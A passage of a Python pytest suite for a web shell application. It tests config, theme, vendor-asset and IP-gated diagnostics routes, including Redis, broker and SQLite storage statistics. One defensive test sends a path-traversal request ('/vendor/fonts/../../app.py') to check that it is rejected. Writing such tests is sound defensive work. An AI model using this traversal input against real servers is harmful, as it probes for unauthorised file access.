            with mock.patch("blueprints.content.load_tour", return_value=tour_payload) as load:
                data = json.loads(client.get("/config").data)

        load.assert_called_once()
        assert data["tour_enabled"] is True
        assert data["tour_version"] == 7
        assert data["tour_chapters"] == tour_payload["chapters"]
        assert data["tour_chapter_count"] == 2

    def test_command_timeout_defaults_to_one_hour(self):
        # Default config keeps long-running commands bounded to an hour
        client = get_client()
        with mock.patch.dict("config.CFG", {"command_timeout_seconds": 3600}):
            data = json.loads(client.get("/config").data)
        assert data["command_timeout_seconds"] == 3600

    def test_diag_enabled_false_when_cidrs_empty(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": []}):
            data = json.loads(client.get("/config").data)
        assert data["diag_enabled"] is False

    def test_diag_enabled_false_when_client_ip_not_in_cidrs(self):
        client = get_client(use_forwarded_for=False)
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["10.0.0.0/8"]}):
            data = json.loads(client.get("/config").data)
        assert data["diag_enabled"] is False

    def test_diag_enabled_true_when_client_ip_in_cidrs(self):
        client = get_client(use_forwarded_for=False)
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/config").data)
        assert data["diag_enabled"] is True

    def test_diag_enabled_uses_trusted_forwarded_for_when_present(self):
        client = get_client(use_forwarded_for=True)
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["203.0.113.0/24"],
            "trusted_proxy_cidrs": ["127.0.0.1/32"],
        }):
            data = json.loads(client.get("/config").data)
        assert data["diag_enabled"] is True

    def test_diag_enabled_ignores_forwarded_for_from_untrusted_peer(self):
        client = get_client(use_forwarded_for=True)
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["203.0.113.0/24"],
            "trusted_proxy_cidrs": ["10.0.0.0/8"],
        }):
            data = json.loads(client.get("/config").data)
        assert data["diag_enabled"] is False

    def test_share_redaction_rules_reflect_cfg(self):
        client = get_client()
        rules = [
            {"label": "bearer", "pattern": "Bearer\\s+\\S+", "replacement": "Bearer [redacted]", "flags": "i"},
        ]
        with mock.patch.dict("config.CFG", {
            "share_redaction_enabled": True,
            "share_redaction_rules": rules,
        }):
            data = json.loads(client.get("/config").data)
        assert data["share_redaction_enabled"] is True
        assert any(rule["label"] == "bearer token" for rule in data["share_redaction_rules"])
        assert data["share_redaction_rules"][-1] == rules[0]

    def test_share_redaction_rules_empty_when_disabled(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {
            "share_redaction_enabled": False,
            "share_redaction_rules": [
                {"label": "custom", "pattern": "internal", "replacement": "[custom]"},
            ],
        }):
            data = json.loads(client.get("/config").data)
        assert data["share_redaction_enabled"] is False
        assert data["share_redaction_rules"] == []


# ── /themes ──────────────────────────────────────────────────────────────────

class TestThemesRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/themes")
        assert resp.status_code == 200

    def test_response_has_current_and_themes(self):
        client = get_client()
        data = json.loads(client.get("/themes").data)
        assert "current" in data
        assert "themes" in data
        assert isinstance(data["themes"], list)

    def test_includes_named_theme_variants(self):
        client = get_client()
        data = json.loads(client.get("/themes").data)
        themes = {theme["name"]: theme for theme in data["themes"]}
        assert "apricot_sand" in themes
        assert "olive_grove" in themes
        assert "darklab_obsidian" in themes
        assert "emerald_obsidian" in themes
        assert "charcoal_steel" in themes
        assert "dark" not in themes
        assert "light" not in themes
        assert themes["apricot_sand"]["label"] == "Apricot Sand"
        assert themes["olive_grove"]["label"] == "Olive Grove"
        assert themes["darklab_obsidian"]["label"] == "Darklab Obsidian"
        assert themes["emerald_obsidian"]["label"] == "Emerald Obsidian"
        assert themes["charcoal_steel"]["label"] == "Charcoal Steel"
        assert themes["apricot_sand"]["group"] == "Warm Light"
        assert themes["olive_grove"]["group"] == "Warm Light"
        assert themes["darklab_obsidian"]["group"] == "Dark Neon"
        assert themes["emerald_obsidian"]["group"] == "Dark Neon"
        assert themes["apricot_sand"]["filename"] == "apricot_sand.yaml"
        assert themes["olive_grove"]["filename"] == "olive_grove.yaml"
        assert themes["darklab_obsidian"]["filename"] == "darklab_obsidian.yaml"
        assert themes["emerald_obsidian"]["filename"] == "emerald_obsidian.yaml"

    def test_default_theme_is_exposed_as_filename(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"default_theme": "darklab_obsidian.yaml"}):
            data = json.loads(client.get("/config").data)
        assert data["default_theme"] == "darklab_obsidian.yaml"

    def test_default_theme_filename_selects_variant(self):
        client = get_client(use_forwarded_for=False)
        data = json.loads(client.get("/themes").data)
        assert data["current"]["name"] == "darklab_obsidian"
        assert data["current"]["filename"] == "darklab_obsidian.yaml"
        assert data["current"]["label"] == "Darklab Obsidian"
        assert data["current"]["group"] == "Dark Neon"
        assert data["current"]["sort"] == 0

    def test_pref_theme_name_cookie_selects_variant(self):
        client = get_client(use_forwarded_for=False)
        client.set_cookie("pref_theme_name", "apricot_sand")
        data = json.loads(client.get("/themes").data)
        assert data["current"]["name"] == "apricot_sand"
        assert data["current"]["label"] == "Apricot Sand"
        assert data["current"]["group"] == "Warm Light"

    def test_empty_registry_falls_back_to_built_in_dark_theme(self, monkeypatch):
        client = get_client(use_forwarded_for=False)
        monkeypatch.setitem(config.CFG, "default_theme", "theme_missing.yaml")
        monkeypatch.setitem(shell_app.get_theme_entry.__globals__, "THEME_REGISTRY_MAP", {})
        monkeypatch.setitem(shell_app.get_theme_entry.__globals__, "THEME_REGISTRY", [])

        data = json.loads(client.get("/themes").data)
        assert data["current"]["name"] == "dark"
        assert data["current"]["source"] == "built-in"
        assert data["current"]["group"] == "Other"
        assert data["current"]["sort"] == 0
        assert data["themes"] == []


# ── /vendor assets ───────────────────────────────────────────────────────────

class TestVendorAssets:
    def test_ansi_up_js_is_served(self):
        client = get_client()
        resp = client.get("/vendor/ansi_up.js")
        assert resp.status_code == 200
        assert "javascript" in resp.content_type

    def test_jspdf_js_is_served(self):
        client = get_client()
        resp = client.get("/vendor/jspdf.umd.min.js")
        assert resp.status_code == 200
        assert "javascript" in resp.content_type

    def test_xterm_js_is_served(self):
        client = get_client()
        resp = client.get("/vendor/xterm.js")
        assert resp.status_code == 200
        assert "javascript" in resp.content_type

    def test_xterm_fit_js_is_served(self):
        client = get_client()
        resp = client.get("/vendor/xterm-addon-fit.js")
        assert resp.status_code == 200
        assert "javascript" in resp.content_type

    def test_xterm_css_is_served(self):
        client = get_client()
        resp = client.get("/vendor/xterm.css")
        assert resp.status_code == 200
        assert "text/css" in resp.content_type

    def test_font_route_serves_committed_file(self, tmp_path, monkeypatch):
        client = get_client()
        font_dir = tmp_path / "fonts"
        font_dir.mkdir()
        (font_dir / "JetBrainsMono-400.ttf").write_bytes(b"font bytes")
        monkeypatch.setattr(shell_assets, "_FONT_DIR", font_dir)

        resp = client.get("/vendor/fonts/JetBrainsMono-400.ttf")
        assert resp.status_code == 200
        assert resp.data == b"font bytes"

    def test_font_route_rejects_unknown_or_traversal_paths(self):
        client = get_client()

        resp = client.get("/vendor/fonts/UnknownFont.ttf")
        assert resp.status_code == 404

        resp = client.get("/vendor/fonts/../../app.py")
        assert resp.status_code == 404


# ── /diag ─────────────────────────────────────────────────────────────────────

class TestDiagRoute:
    """Operator diagnostics endpoint — IP-gated, returns 404 when unconfigured."""

    def _allowed_client(self):
        """Test client whose remote_addr (127.0.0.1) matches the allowed CIDR."""
        shell_app.app.config["TESTING"] = True
        # No X-Forwarded-For — we want remote_addr to be 127.0.0.1 (Werkzeug default)
        return shell_app.app.test_client()

    def test_returns_404_when_cidrs_empty(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": []}):
            with mock.patch.object(logging.getLogger("shell"), "warning") as mock_warn:
                resp = client.get("/diag")
        assert resp.status_code == 404
        mock_warn.assert_called_once()
        event = mock_warn.call_args[0][0]
        assert event == "DIAG_DENIED"
        assert mock_warn.call_args[1]["extra"]["ip"] == "127.0.0.1"
        assert mock_warn.call_args[1]["extra"]["allowed_cidrs"] == []

    def test_returns_404_when_cidrs_not_set(self):
        client = self._allowed_client()
        cfg_without_key = {k: v for k, v in config.CFG.items() if k != "diagnostics_allowed_cidrs"}
        with mock.patch.dict("config.CFG", cfg_without_key, clear=True):
            resp = client.get("/diag")
        assert resp.status_code == 404

    def test_returns_404_when_client_ip_not_in_cidrs(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["10.0.0.0/8"]}):
            resp = client.get("/diag")
        assert resp.status_code == 404

    def test_returns_200_when_client_ip_in_cidrs(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            resp = client.get("/diag")
        assert resp.status_code == 200

    def test_response_has_expected_top_level_keys(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        assert set(data.keys()) >= {"app", "config", "db", "redis", "broker", "pty", "assets", "tools"}

    def test_app_section_has_version_and_name(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
            "app_name": "test shell",
        }):
            data = json.loads(client.get("/diag?format=json").data)
        assert data["app"]["name"] == "test shell"
        assert isinstance(data["app"]["version"], str)

    def test_config_section_contains_operational_keys(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        cfg = data["config"]
        for key in ("rate_limit_enabled", "command_timeout_seconds", "max_output_lines",
                    "high_volume_output_line_threshold", "high_volume_output_status_interval_lines",
                    "interactive_pty_input_max_bytes", "interactive_pty_control_poll_seconds",
                    "persist_full_run_output", "permalink_retention_days",
                    "share_redaction_enabled", "custom_redaction_rule_count"):
            assert key in cfg, f"missing config key: {key}"

    def test_pty_section_contains_operator_metrics(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
            body = client.get("/diag").get_data(as_text=True)
        pty = data["pty"]
        for key in (
            "active",
            "completed_count",
            "average_seconds",
            "p95_seconds",
            "input_bytes",
            "dropped_input_bytes",
            "control_queue_depth",
        ):
            assert key in pty
        assert "Interactive PTY" in body

    def test_every_config_key_belongs_to_a_group(self):
        """Drift guard: every key emitted into result['config'] must be
        listed in exactly one `_DIAG_CONFIG_GROUPS` entry, otherwise it
        renders nowhere on the page."""
        grouped: set[str] = set()
        seen_twice: set[str] = set()
        for _label, keys in shell_assets._DIAG_CONFIG_GROUPS:
            for key in keys:
                if key in grouped:
                    seen_twice.add(key)
                grouped.add(key)
        assert not seen_twice, f"config keys appear in multiple groups: {seen_twice}"
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        emitted = set(data["config"].keys())
        missing_from_groups = emitted - grouped
        assert not missing_from_groups, (
            f"config keys not in any group (would be invisible on /diag): {missing_from_groups}"
        )

    def test_html_response_renders_config_group_labels(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            body = client.get("/diag").get_data(as_text=True)
        for label, _keys in shell_assets._DIAG_CONFIG_GROUPS:
            assert label in body, f"config group label '{label}' not rendered"
        assert "diag-config-group-label" in body

    def test_db_section_ok_and_has_counts(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        assert data["db"]["ok"] is True
        assert isinstance(data["db"]["runs"], int)
        assert isinstance(data["db"]["snapshots"], int)
        project_workspace = data["db"]["project_workspace"]
        for key in ("projects", "artifacts", "findings", "notes", "packages"):
            assert isinstance(project_workspace[key], int)

    def test_db_section_error_on_db_failure(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch("blueprints.assets.db_connect", side_effect=Exception("db down")):
                data = json.loads(client.get("/diag?format=json").data)
        assert data["db"]["ok"] is False
        assert "error" in data["db"]

    def test_redis_section_reflects_client_presence(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        assert "configured" in data["redis"]

    def _fake_redis_client(self, *, ping_exc=None, scan_keys=None, info_data=None,
                           sismember_map=None, get_map=None, dbsize=None,
                           xlen_map=None):
        """Build a MagicMock that mimics the redis-py methods _diag_redis_stats uses."""
        scan_keys = scan_keys or {}
        info_data = info_data or {}
        sismember_map = sismember_map or {}
        get_map = get_map or {}
        xlen_map = xlen_map or {}

        fake = mock.MagicMock()
        if ping_exc is None:
            fake.ping.return_value = True
        else:
            fake.ping.side_effect = ping_exc
        fake.dbsize.return_value = dbsize if dbsize is not None else sum(
            len(keys) for keys in scan_keys.values()
        )

        def scan(cursor=0, match=None, count=None):  # noqa: ARG001
            keys = scan_keys.get(match, [])
            return (0, list(keys))
        fake.scan.side_effect = scan
        fake.xlen.side_effect = lambda key: xlen_map.get(key, 0)
        fake.get.side_effect = lambda key: get_map.get(key)
        fake.sismember.side_effect = lambda key, member: bool(
            member in sismember_map.get(key, set())
        )
        fake.info.side_effect = lambda section: info_data.get(section, {})
        return fake

    def test_redis_stats_present_when_client_reachable(self):
        client = self._allowed_client()
        run_id = "r1"
        meta_payload = json.dumps({"session_id": "s1", "run_id": run_id})
        fake = self._fake_redis_client(
            scan_keys={
                "runstream:*":     [f"runstream:{run_id}"],
                "proc:*":          [f"proc:{run_id}"],
                "procmeta:*":      [f"procmeta:{run_id}"],
                "sessionprocs:*":  ["sessionprocs:s1"],
            },
            xlen_map={f"runstream:{run_id}": 17},
            get_map={f"procmeta:{run_id}": meta_payload},
            sismember_map={"sessionprocs:s1": {run_id}},
            info_data={
                "memory":      {"used_memory_human": "1.2M", "used_memory_peak_human": "2.0M",
                                "maxmemory_human": "0", "mem_fragmentation_ratio": 1.05},
                "persistence": {"aof_enabled": 1, "rdb_last_save_time": int(time.time()) - 90,
                                "rdb_changes_since_last_save": 4},
                "stats":       {"evicted_keys": 0, "expired_keys": 12},
                "clients":     {"connected_clients": 3, "rejected_connections": 0},
            },
        )
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch.object(shell_assets, "redis_client", fake):
                data = json.loads(client.get("/diag?format=json").data)
        stats = data["redis"]["stats"]
        assert data["redis"]["ok"] is True
        assert isinstance(stats["ping_ms"], (int, float))
        assert stats["dbsize"] == 4
        names = {ns["name"]: ns for ns in stats["namespaces"]}
        assert names["runstream"]["count"] == 1
        assert names["procmeta"]["count"] == 1
        assert "capped" not in names["runstream"]
        assert stats["stream_length"]["max"] == 17
        assert stats["orphans"] == {"probed": 1, "orphaned": 0}
        assert stats["memory"]["used"] == "1.2M"
        assert stats["persistence"]["aof_enabled"] is True
        assert stats["persistence"]["rdb_last_save_human"].endswith(" ago")
        assert stats["evicted_keys"] == 0
        assert stats["clients"]["connected"] == 3
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch.object(shell_assets, "redis_client", fake):
                body = client.get("/diag").get_data(as_text=True)
        assert "RDB saved" in body
        assert "changes since save" in body
        assert "AOF on" not in body
        assert "AOF off" not in body

    def test_redis_stats_absent_when_ping_fails(self):
        client = self._allowed_client()
        fake = self._fake_redis_client(ping_exc=ConnectionError("redis unreachable"))
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch.object(shell_assets, "redis_client", fake):
                data = json.loads(client.get("/diag?format=json").data)
        assert data["redis"]["ok"] is False
        assert "redis unreachable" in data["redis"]["error"]
        assert "stats" not in data["redis"]

    def test_redis_orphan_count_flags_dangling_procmeta(self):
        client = self._allowed_client()
        # procmeta:r2 references session s2, but sessionprocs:s2 has no member r2 → orphan.
        fake = self._fake_redis_client(
            scan_keys={
                "runstream:*":    [],
                "proc:*":         [],
                "procmeta:*":     ["procmeta:r2"],
                "sessionprocs:*": ["sessionprocs:s2"],
            },
            get_map={"procmeta:r2": json.dumps({"session_id": "s2", "run_id": "r2"})},
            sismember_map={"sessionprocs:s2": set()},
        )
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch.object(shell_assets, "redis_client", fake):
                data = json.loads(client.get("/diag?format=json").data)
        assert data["redis"]["stats"]["orphans"] == {"probed": 1, "orphaned": 1}

    def test_redis_namespace_count_marks_capped_when_scan_hits_limit(self):
        client = self._allowed_client()
        cap = shell_assets._DIAG_REDIS_SCAN_KEY_CAP
        # Return cap+1 fake runstream keys so the bounded scan trips the capped flag.
        many_streams = [f"runstream:r{i}" for i in range(cap + 5)]
        fake = self._fake_redis_client(
            scan_keys={
                "runstream:*":    many_streams,
                "proc:*":         [],
                "procmeta:*":     [],
                "sessionprocs:*": [],
            },
        )
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch.object(shell_assets, "redis_client", fake):
                data = json.loads(client.get("/diag?format=json").data)
        runstream_ns = next(ns for ns in data["redis"]["stats"]["namespaces"]
                            if ns["name"] == "runstream")
        assert runstream_ns["capped"] is True
        assert runstream_ns["count"] == cap

    def test_broker_section_reports_in_process_mode_when_redis_unconfigured(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch.object(shell_assets, "redis_client", None):
                data = json.loads(client.get("/diag?format=json").data)
        broker = data["broker"]
        assert broker["mode"] == "in_process"
        assert "fallback" in broker
        for key in ("streams", "active", "closed", "expired_pending_purge",
                    "events", "bytes", "pid_count", "active_run_count",
                    "session_count"):
            assert key in broker["fallback"], f"missing fallback key: {key}"

    def test_broker_section_omits_fallback_when_redis_configured(self):
        client = self._allowed_client()
        fake = self._fake_redis_client()
        # `broker_mode()` reads from run_broker's own module-level reference,
        # so patch both the assets-blueprint binding and the broker module.
        import services.runs.broker as shell_broker
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch.object(shell_assets, "redis_client", fake):
                with mock.patch.object(shell_broker, "redis_client", fake):
                    data = json.loads(client.get("/diag?format=json").data)
        broker = data["broker"]
        assert broker["mode"] == "redis"
        assert "fallback" not in broker

    def test_broker_section_reports_unavailable_when_disabled(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
            "run_broker_enabled": False,
        }):
            data = json.loads(client.get("/diag?format=json").data)
        broker = data["broker"]
        assert broker["available"] is False
        assert "disabled" in broker["unavailable_reason"].lower()

    def test_broker_fallback_snapshot_reflects_published_events(self):
        client = self._allowed_client()
        # Publish two events to the in-memory store so the snapshot is non-empty.
        # Use a dedicated module import to avoid leaking state across tests.
        import services.runs.broker as shell_broker
        run_id = f"diag-test-{uuid.uuid4().hex}"
        try:
            shell_broker._memory_store.publish(run_id, "stdout", {"line": "hi"})
            shell_broker._memory_store.publish(run_id, "stdout", {"line": "again"})
            with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
                with mock.patch.object(shell_assets, "redis_client", None):
                    data = json.loads(client.get("/diag?format=json").data)
            fb = data["broker"]["fallback"]
            assert fb["streams"] >= 1
            assert fb["events"] >= 2
            assert fb["active"] >= 1
            assert fb["bytes"] > 0
        finally:
            # Trip the snapshot's purge: drop the test run from the in-memory
            # store so we don't leak state into later tests.
            with shell_broker._memory_store._lock:
                shell_broker._memory_store._events.pop(run_id, None)
                shell_broker._memory_store._bytes.pop(run_id, None)
                shell_broker._memory_store._closed.discard(run_id)
                shell_broker._memory_store._expires_at.pop(run_id, None)

    def test_db_section_reports_file_size_and_human(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        db = data["db"]
        assert isinstance(db["size"], int) and db["size"] > 0
        assert db["size_human"]
        assert any(db["size_human"].endswith(unit) for unit in (" B", " KB", " MB", " GB"))
        # WAL size key is always populated (zero if no -wal sidecar exists)
        assert isinstance(db["wal_size"], int)
        assert db["wal_size_human"]

    def test_db_section_reports_journal_mode(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        # SQLite returns one of: delete, truncate, persist, memory, wal, off.
        assert data["db"]["journal_mode"] in {
            "delete", "truncate", "persist", "memory", "wal", "off",
        }

    def test_db_section_reports_freelist_and_reclaimable_bytes(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        db = data["db"]
        assert isinstance(db["page_count"], int) and db["page_count"] > 0
        assert isinstance(db["page_size"], int) and db["page_size"] > 0
        assert isinstance(db["freelist_count"], int) and db["freelist_count"] >= 0
        assert db["reclaimable_size"] == db["freelist_count"] * db["page_size"]
        assert db["reclaimable_size_human"]

    def test_db_section_reports_per_table_row_counts(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        tables = data["db"]["tables"]
        assert isinstance(tables, list) and tables
        names = {t["name"] for t in tables}
        # Core schema tables are present and FTS5 shadow tables are not.
        assert "runs" in names
        assert not any(name.startswith("sqlite_") for name in names)
        assert not any(name.startswith("runs_fts_") for name in names), (
            f"FTS5 shadow tables leaked into the table list: {names}"
        )
        for entry in tables:
            assert isinstance(entry["name"], str) and entry["name"]
            assert isinstance(entry["rows"], int) and entry["rows"] >= 0

    def test_db_storage_breakdown_reports_buckets(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        storage = data["db"]["storage"]
        assert isinstance(storage["dbstat_available"], bool)
        assert storage["buckets"]
        bucket_names = {bucket["name"] for bucket in storage["buckets"]}
        assert "Runs and transcripts" in bucket_names
        run_bucket = next(bucket for bucket in storage["buckets"] if bucket["name"] == "Runs and transcripts")
        run_entry = next(row for row in run_bucket["rows"] if row["name"] == "runs")
        assert isinstance(run_entry["rows"], int)
        assert isinstance(run_entry["logical_payload"], int)
        assert run_entry["logical_payload_human"]

    def test_db_storage_breakdown_sums_payload_and_artifact_bytes(self, tmp_path):
        db_path = tmp_path / "diag_storage_payload.db"
        with sqlite3.connect(db_path) as conn:
            conn.execute(
                "CREATE TABLE runs ("
                "id TEXT PRIMARY KEY, command TEXT NOT NULL, output TEXT, "
                "output_preview TEXT, output_search_text TEXT)"
            )
            conn.execute(
                "CREATE TABLE run_output_artifacts ("
                "run_id TEXT PRIMARY KEY, rel_path TEXT NOT NULL, compression TEXT NOT NULL, byte_size INTEGER NOT NULL)"
            )
            conn.execute(
                "INSERT INTO runs (id, command, output, output_preview, output_search_text) "
                "VALUES (?, ?, ?, ?, ?)",
                ("run-a", "dig darklab.sh", "abc", "de", "fghi"),
            )
            conn.execute(
                "INSERT INTO run_output_artifacts (run_id, rel_path, compression, byte_size) "
                "VALUES (?, ?, ?, ?)",
                ("run-a", "out.gz", "gzip", 128),
            )
            conn.commit()
            storage = shell_assets._diag_table_storage_breakdown(conn, {
                "runs": 1,
                "run_output_artifacts": 1,
            })

        run_entry = next(
            row for bucket in storage["buckets"] for row in bucket["rows"]
            if row["name"] == "runs"
        )
        artifact_entry = next(
            row for bucket in storage["buckets"] for row in bucket["rows"]
            if row["name"] == "run_output_artifacts"
        )
        assert run_entry["logical_payload"] == len("dig darklab.sh") + len("abc") + len("de") + len("fghi")
        assert artifact_entry["logical_payload"] == len("out.gz") + len("gzip") + 128
        assert storage["largest_runs"][0]["id"] == "run-a"

        without_output_path = tmp_path / "diag_storage_payload_without_output.db"
        with sqlite3.connect(without_output_path) as conn:
            conn.execute(
                "CREATE TABLE runs ("
                "id TEXT PRIMARY KEY, command TEXT NOT NULL, output_preview TEXT, output_search_text TEXT)"
            )
            conn.execute(
                "INSERT INTO runs (id, command, output_preview, output_search_text) "
                "VALUES (?, ?, ?, ?)",
                ("run-b", "host darklab.sh", "preview", "search"),
            )
            conn.commit()
            storage_without_output = shell_assets._diag_table_storage_breakdown(conn, {"runs": 1})

        assert storage_without_output["largest_runs"][0]["id"] == "run-b"
        assert storage_without_output["largest_runs"][0]["payload"] == len("preview") + len("search")
        assert not any("largest runs probe failed" in error for error in storage_without_output["errors"])

    def test_db_storage_breakdown_rolls_up_fts_shadow_tables(self, tmp_path):
        db_path = tmp_path / "diag_storage_fts.db"
        with sqlite3.connect(db_path) as conn:
            conn.execute(
                "CREATE TABLE runs ("
                "id TEXT PRIMARY KEY, command TEXT NOT NULL, output TEXT, "
                "output_preview TEXT, output_search_text TEXT)"
            )
            conn.execute(
                "CREATE VIRTUAL TABLE runs_fts USING fts5("
                "command, output_search_text, content=runs, content_rowid=rowid)"
            )
            conn.execute(
                "INSERT INTO runs (id, command, output, output_preview, output_search_text) "
                "VALUES (?, ?, ?, ?, ?)",
                ("run-fts", "host darklab.sh", "", "", "104.21.4.35"),
            )
            rowid = conn.execute("SELECT rowid FROM runs WHERE id = ?", ("run-fts",)).fetchone()[0]
            conn.execute(
                "INSERT INTO runs_fts(rowid, command, output_search_text) VALUES (?, ?, ?)",
                (rowid, "host darklab.sh", "104.21.4.35"),
            )
            conn.commit()
            storage = shell_assets._diag_table_storage_breakdown(conn, {"runs": 1, "runs_fts": 1})

        if not storage["dbstat_available"]:
            pytest.skip("SQLite dbstat virtual table is unavailable")
        fts_entry = next(
            row for bucket in storage["buckets"] for row in bucket["rows"]
            if row["name"] == "runs_fts"
        )
        assert fts_entry["kind"] == "virtual-table"
        assert {shadow["name"] for shadow in fts_entry["shadows"]} >= {
            "runs_fts_data",
            "runs_fts_idx",
        }

    def test_db_storage_breakdown_falls_back_without_dbstat(self, tmp_path):
        class _FakeCursor:
            def __init__(self, rows):
                self._rows = rows

            def fetchone(self):
                return self._rows[0] if self._rows else None

        class _NoDbstatConn:
            def __init__(self, conn):
                self._conn = conn

            def execute(self, sql, params=()):
                if "sqlite_compileoption_used('ENABLE_DBSTAT_VTAB')" in sql:
                    return _FakeCursor([(0,)])
                assert "FROM dbstat" not in sql
                return self._conn.execute(sql, params)

        db_path = tmp_path / "diag_storage_no_dbstat.db"
        with sqlite3.connect(db_path) as conn:
            conn.execute(
                "CREATE TABLE runs ("
                "id TEXT PRIMARY KEY, command TEXT NOT NULL, output TEXT, "
                "output_preview TEXT, output_search_text TEXT)"
            )
            conn.execute(
                "INSERT INTO runs (id, command, output, output_preview, output_search_text) "
                "VALUES (?, ?, ?, ?, ?)",
                ("run-no-dbstat", "whois darklab.sh", "abc", "", "abc"),
            )
            conn.commit()
            storage = shell_assets._diag_table_storage_breakdown(_NoDbstatConn(conn), {"runs": 1})

        run_entry = next(
            row for bucket in storage["buckets"] for row in bucket["rows"]
            if row["name"] == "runs"
        )
        assert storage["dbstat_available"] is False
        assert run_entry["allocated_human"] == "—"
        assert run_entry["logical_payload"] == len("whois darklab.sh") + len("abc") + len("abc")

    def test_html_response_renders_storage_breakdown_section(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            body = client.get("/diag").get_data(as_text=True)
        assert "Storage breakdown" in body
        assert "Runs and transcripts" in body
        assert "Largest saved runs" in body or "Largest saved runs skipped" in body

    def test_db_section_quotes_metadata_table_names_for_row_counts(self, tmp_path):
        db_path = tmp_path / "diag_tables.db"
        with sqlite3.connect(db_path) as conn:
            conn.execute('CREATE TABLE "odd""table" (id INTEGER PRIMARY KEY)')
            conn.execute('INSERT INTO "odd""table" DEFAULT VALUES')
            conn.execute('INSERT INTO "odd""table" DEFAULT VALUES')
            conn.commit()

        def connect_tmp_db():
            return sqlite3.connect(db_path)

        with mock.patch.object(shell_assets, "DB_PATH", str(db_path)), \
             mock.patch.object(shell_assets, "db_connect", connect_tmp_db):
            info = shell_assets._diag_db_stats()

        assert {"name": 'odd"table', "rows": 2} in info["tables"]

    def test_diag_sqlite_identifier_rejects_empty_or_nul_names(self):
        assert quote_sqlite_identifier('odd"table') == '"odd""table"'
        with pytest.raises(ValueError):
            quote_sqlite_identifier("")
        with pytest.raises(ValueError):
            quote_sqlite_identifier("bad\x00name")

    def test_db_section_runs_and_snapshots_remain_at_top_level(self):
        """Backward-compat for the original /diag schema — `runs` and
        `snapshots` are still surfaced at db.* even though they are also
        listed inside `tables`."""
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        assert isinstance(data["db"]["runs"], int)
        assert isinstance(data["db"]["snapshots"], int)
        # Match the per-table row count.
        runs_in_table = next(
            (t["rows"] for t in data["db"]["tables"] if t["name"] == "runs"), None
        )
        assert data["db"]["runs"] == runs_in_table

    def test_db_section_reports_fts_orphan_count(self):
        client = self._allowed_client()
